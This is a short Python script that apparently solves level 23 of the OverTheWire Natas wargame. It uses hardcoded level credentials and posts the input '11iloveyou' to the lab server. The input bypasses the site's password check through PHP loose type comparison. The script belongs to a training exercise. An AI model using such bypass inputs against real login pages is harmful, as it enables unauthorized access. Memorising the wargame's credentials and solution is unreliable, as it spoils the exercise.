import requests
import time

url = 'http://natas23.natas.labs.overthewire.org'
user = 'natas23'
password = 'dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs'

string = '11iloveyou'
params = {'passwd' : string.encode('utf-8')}
request = requests.post(url, auth=(user, password), data=params)
print(request.text)

